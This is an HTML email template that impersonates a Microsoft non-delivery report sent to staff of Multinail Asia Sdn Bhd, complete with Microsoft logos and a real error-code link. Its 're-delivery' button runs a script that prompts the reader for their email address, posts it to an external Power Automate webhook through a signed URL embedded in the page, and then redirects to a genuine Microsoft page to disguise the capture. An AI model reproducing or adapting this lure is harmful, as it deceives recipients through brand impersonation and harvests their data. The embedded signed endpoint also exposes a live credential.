<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Failed to send email</title>
  <style>
    body {
      font-family: Segoe UI, Tahoma, Geneva, Verdana, sans-serif;
      margin: 0px;
      color: #333;
      background-color: #fff;
    }

    .card {
      max-width: 700px;
      margin: 0 auto;
      background-color: #fff;
      padding: 40px;
      border-radius: 12px;
    }

    .header {
      display: flex;
      align-items: center;
    }

    .header img {
      max-width: 180px;
      height: auto;
      margin-bottom: 20px;
    }

    .img {
      max-width: 30px;
      height: 30px;
    }

    h2 {
      color: #000000;
    }

    .info-icon {
      color: #0078D4;
      font-weight: bold;
      font-size: 20px;
      margin-right: 8px;
    }

    table {
      border-collapse: collapse;
      margin-top: 10px;
      margin-bottom: 30px;
      width: 100%;
    }

    td {
      padding: 8px;
      border-bottom: 1px solid #ddd;
    }

    td + td {
      padding-left: 4px;
    }

    td:first-child {
      padding-right: 4px;
    }

    .section-title {
      font-weight: bold;
      font-size: 18px;
      margin-top: 30px;
    }

    a {
      color: #0078D4;
      text-decoration: none;
    }

    a:hover {
      text-decoration: underline;
    }

    .footer {
      margin-top: 30px;
      font-size: 12px;
      color: #555;
      background-color: #f2f2f2;
      padding: 20px;
      border-radius: 6px;
    }

    .footer img {
      width: 90px;
      margin-top: 10px;
    }
  </style>
</head>
<body>
  <div class="card">
    <div class="header">
      <img src="https://cdn.brandfetch.io/idchmboHEZ/theme/dark/logo.svg?c=1dxbfHSJFAPEGdCLU4o5B" alt="Microsoft Logo">
    </div>

    <div style="display: flex; align-items: center; gap: 10px;">
      <img class="img" src="https://i.imgur.com/clStBFk.png" alt="Check-in image" style="width: 24px; height: 24px;">
      <h2 style="margin: 0;"> Email Delivery Failure – Action Required</h2>
    </div>

    <p>This is an automatically generated Delivery Status Notification.<br>
      Delivery to the recipient failed permanently:
      This message was generated automatically by your company’s email delivery system.
      One or more emails you attempted to send could not be delivered. 
      Details are included below.
    </p>

    <div class="section-title">Technical Details</div>
    <table>
      <tr>
        <td><strong>Expired on</strong></td>
        <td>June 20, 2025</td>
      </tr>
      <tr>
        <td><strong>Organization name</strong></td>
        <td>Multinail Asia Sdn Bhd</td>
      </tr>
      <tr>
        <td><strong>Reason</strong></td>
        <td>Microsoft tried to deliver your message, but it was rejected by the recipient domain</td>
      </tr>
      <tr>
        <td><strong>Error code</strong></td>
        <td><a href="https://learn.microsoft.com/en-us/exchange/troubleshoot/email-delivery/ndr/fix-error-code-550-5-1-1-through-5-1-20-in-exchange-online">550 5.1.1 User Unknown or Mailbox Unavailable</a></td>
      </tr>
    </table>

    <p>To review the email and attempt re-delivery, please click below:</p>

    <!-- Image triggers log and redirects -->
    <a href="https://www.microsoft.com/en-my/microsoft-365/outlook/email-and-calendar-software-microsoft-outlook" onclick="logClick(event)">
      <img src="https://i.imgur.com/IKTEiGM.png" 
           alt="Click to Log" 
           style="width:150px;height:auto;border:0;">
    </a>

    <hr style="border: 0; height: 2px; background-color: #ddd; margin-top: 20px; margin-bottom: 20px;">

    <div class="section-title">Account information</div>
    <p><strong>Organization name:</strong> Multinail Asia Sdn. Bhd.</p>
    <p style="margin-top: 1px;"><strong>Domain:</strong> multinailasia.com</p>

    <div class="footer">
      <a href="https://www.microsoft.com/en-us/privacy/privacystatement">Privacy Statement</a><br>
      Microsoft Corporation, One Microsoft Way, Redmond, WA 98052<br>
      <img src="https://cdn.brandfetch.io/idchmboHEZ/theme/dark/logo.svg?c=1dxbfHSJFAPEGdCLU4o5B" alt="Microsoft Logo">
    </div>
  </div>

  <script>
  function logClick(e) {
    e.preventDefault();

    const destinationUrl = "https://www.microsoft.com/en-my/microsoft-365/outlook/email-and-calendar-software-microsoft-outlook";

    // Capture current timestamp
    const timestamp = new Date().toISOString();

    // Optional: Prompt for user's email (you can remove this if not needed)
    const email = prompt("Please enter your email address to continue:");
    if (!email || !validateEmail(email)) {
      alert("A valid email address is required.");
      return;
    }

    const payload = {
      email: email,
      clickedAt: timestamp
    };

    const logUrl = "https://defaultd0a8d68407ff4666b6c37ba779595f.e9.environment.api.powerplatform.com:443/powerautomate/automations/direct/workflows/32f5035c5156480caad92d300f62b150/triggers/manual/paths/invoke/?api-version=1&tenantId=tId&environmentName=Default-d0a8d684-07ff-4666-b6c3-7ba779595fe9&sp=%2Ftriggers%2Fmanual%2Frun&sv=1.0&sig=wf4j1UnWzq1_nHf2sB40CZ98AW84PwVHTuCEZTRPM34";

    // Log the click with timestamp and email
    fetch(logUrl, {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify(payload)
    }).then(() => {
      // Redirect after logging
      window.location.href = destinationUrl;
    }).catch((err) => {
      console.error("Logging failed, redirecting anyway", err);
      window.location.href = destinationUrl;
    });
  }

  function validateEmail(email) {
    const re = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
    return re.test(email);
  }
</script>

</body>
</html>
